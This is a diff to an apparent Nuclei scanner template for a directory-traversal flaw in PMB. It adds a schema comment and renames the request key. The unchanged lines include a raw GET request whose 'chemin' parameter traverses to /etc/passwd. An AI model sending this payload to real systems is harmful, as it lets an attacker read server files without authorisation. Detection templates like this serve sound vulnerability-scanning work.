@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: pmb-directory-traversal2
 
 info:
@@ -9,7 +10,7 @@ info:
   tags: lfi
 
 
-requests:
+http:
   - raw:
       - |
         GET /pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik HTTP/1.1
